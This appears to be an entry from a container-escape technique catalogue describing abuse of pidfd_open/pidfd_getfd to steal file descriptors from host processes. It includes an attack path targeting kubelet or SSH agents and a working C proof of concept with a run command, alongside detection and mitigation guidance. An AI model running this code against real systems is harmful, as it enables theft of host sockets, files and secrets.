---
id: CE-002
name: pidfd_getfd / pidfd_open abuse
category: kernel/proc
mitre_attack: [T1055, T1611]
risk: high
detection_rules: [SIGMA-002, FALCO-002]
---

# CE-002 — pidfd_getfd / pidfd_open abuse

## Summary

`pidfd_open(2)` opens a stable handle to a process; `pidfd_getfd(2)` duplicates
a file descriptor **from that process** into the caller. The permission model is
`PTRACE_MODE_ATTACH_REALCREDS` — with `CAP_SYS_PTRACE`, or when running as the
same UID in the target's user namespace, any FD belonging to any visible process
is stealable. With `hostPID: true` or a shared PID namespace, that means host
sockets, files, and pipes.

## Prerequisites

- Kernel ≥ 5.6 (`pidfd_getfd`), target visible in the container's PID namespace
- `CAP_SYS_PTRACE` (or ptrace permissions against the target UID)
- `pidfd_getfd` not blocked by seccomp

## Attack path

1. Enumerate host PIDs via `/proc` (hostPID or shared ns)
2. Pick a target: e.g. kubelet, an SSH agent, a database client
3. `pidfd_open(target_pid)` then `pidfd_getfd(pidfd, fd_number, 0)`
4. Use the stolen FD (socket → inject requests; file → exfiltrate)

## PoC sketch

```c
/* steal fd N from pid T; needs ptrace access */
#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
int main(int argc, char **argv) {
    int pidfd = syscall(SYS_pidfd_open, atoi(argv[1]), 0);
    int stolen = syscall(SYS_pidfd_getfd, pidfd, atoi(argv[2]), 0);
    if (stolen < 0) { perror("pidfd_getfd"); return 1; }
    fprintf(stderr, "stole fd %d from pid %s -> %d\n", atoi(argv[2]), argv[1], stolen);
    /* with a socket: write/read; with a file: read it out */
    char buf[4096]; ssize_t n = read(stolen, buf, sizeof buf);
    write(1, buf, n);
    return 0;
}
```

```bash
# in a hostPID pod
gcc -o steal steal.c && ./steal 1234 7   # fd 7 of host pid 1234
```

## Detection

- **Logs:** auditd rules on `pidfd_open`/`pidfd_getfd` syscalls; seccomp
  notification logs from the runtime
- **Sigma:** `SIGMA-002` — pidfd syscall usage
- **Falco:** `FALCO-002` — evt.type `pidfd_getfd`
- **Forensics:** `/proc/<pid>/fdinfo` cross-namespace ownership anomalies

## Mitigation

- Drop `CAP_SYS_PTRACE`; keep `hostPID: false`
- Seccomp: deny `pidfd_open`/`pidfd_getfd` where debugging is not needed
- `hidepid=2` on host `/proc` mounts
- Isolate sensitive host services in separate PID namespaces

## References

- pidfd_getfd(2), pidfd_open(2) man pages
- CVE-2021-22555 (netfilter), a sibling example of syscall-based escape
- MITRE ATT&CK T1055 (Process Injection)
